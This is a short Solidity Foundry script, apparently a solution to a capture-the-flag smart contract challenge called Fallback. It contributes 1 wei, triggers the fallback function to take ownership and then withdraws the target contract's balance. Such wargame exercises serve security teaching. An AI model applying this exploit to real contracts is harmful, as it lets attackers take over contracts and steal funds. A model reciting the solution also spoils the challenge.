// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {Fallback} from "src/fallback.sol";

contract Attack is Script {
    error Attack__failedTransaction();
    address payable targetAddress;

    function run() external returns(Fallback) {
        targetAddress = payable(vm.envAddress("FALLBACK_TARGET"));
        Fallback target = Fallback(targetAddress);

        vm.startBroadcast();///////////////////////////////////////////////
        console.log("It passed!!");
        console.log(address(target));
        console.log(msg.sender);
        console.log(address(target).code.length);

        target.contribute{value: 1 wei}();
        // Claim Ownership
        (bool success, ) = address(target).call{value: 1 wei}("");
        if(!success) revert Attack__failedTransaction();
        // Drain Contract
        target.withdraw();

        vm.stopBroadcast();////////////////////////////////////////////////

        return target;
    }

}